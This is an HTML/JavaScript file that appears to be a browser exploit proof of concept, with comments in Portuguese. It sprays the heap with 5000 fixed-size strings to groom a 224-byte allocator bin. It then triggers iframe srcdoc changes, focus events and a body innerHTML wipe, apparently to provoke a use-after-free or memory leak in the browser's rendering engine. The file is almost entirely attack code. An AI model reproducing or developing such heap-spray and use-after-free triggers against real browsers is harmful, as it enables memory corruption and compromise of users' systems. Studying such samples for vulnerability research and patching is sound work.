<!DOCTYPE html>
<html>
<body>
<iframe id="frame_a" loading="lazy"></iframe>
<iframe id="frame_b" srcdoc="b"></iframe>
<div id="container" tabindex="0" autofocus></div>
<div id="log"></div>
<script>
const logEl = document.getElementById("log");
let visit = localStorage.getItem("visit") || "0";
localStorage.setItem("visit", String(parseInt(visit) + 1));

// N=88: early×2 acumula 176 chars → op() call 3 libera 192 bytes → bin 224
const PAD = "A".repeat(88);

// Pre-spray: 5000 strings de 176 chars = 192 bytes cada (mesmo bin 224)
// Essas são alocadas ANTES do free — ficam no freelist de bin 224
// Quando StringImpl(176) é freed, ele entra no TOPO do freelist bin 224
// srcdoc pega bin 160 (diferente)
// scrollHeight lê bin 224 → pode ler um dos nossos strings?
const spray = [];
for (let i = 0; i < 5000; i++) {
    spray.push("B".repeat(176));
}

const op = () => {
    logEl.textContent += PAD;
    logEl.scrollTop = logEl.scrollHeight;
};

let frame = document.getElementById("frame_a");
op(); op();

addEventListener("load", () => {
    op();
    frame.srcdoc = "a";
    op();
    frame.contentWindow?.addEventListener("blur", () => {});
    frame.focus();
    op();
});

container.onfocusin = () => {
    document.body.innerHTML = "";
};
</script>
</body>
</html>
